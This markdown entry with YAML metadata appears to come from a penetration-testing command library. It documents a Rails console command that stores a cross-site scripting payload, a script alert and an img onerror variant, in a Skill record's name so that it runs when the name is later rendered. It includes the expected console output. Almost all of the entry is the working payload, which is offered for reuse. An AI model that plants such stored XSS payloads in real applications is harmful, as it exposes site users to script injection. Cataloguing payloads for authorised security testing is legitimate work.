---
id: c1d2e3f4-g5h6-7891-cdef-5678901234
data: 'Skill.create! name:''<script>alert(/XSS/);</script>'''
tags:
  - xss
  - rails
  - injection
type: command
output: >-
  => #<Skill id: 1, name: "<script>alert(/XSS/);</script>", created_at:
  "2023-10-01 12:00:00", updated_at: "2023-10-01 12:00:00">
executor: ruby
platforms:
  - Web
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-13T23:52:55.786Z'
verified: false
validated: true
submitted: true
---
# rails-create-malicious-skill

## Command

```ruby
Skill.create! name:'<script>alert(/XSS/);</script>'
```

## Description

This Rails console command creates a new Skill record with a name containing a stored XSS payload, exploiting unsanitized input for later HTML rendering.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| name | The skill name, set to XSS payload like '<script>alert(/XSS/);</script>' | Yes |

## Examples

### Basic Usage

```ruby
Skill.create! name:'<script>alert(/XSS/);</script>'
```

### Advanced Usage

```ruby
Skill.create! name:'<img src=x onerror=alert(/XSS/)>'
```

## Expected Output

A new Skill object is returned, confirming creation with the malicious name stored in the database.

## Related

- [[Related Procedure|procedures/Create-Malicious-Skill-with-XSS-Payload]]
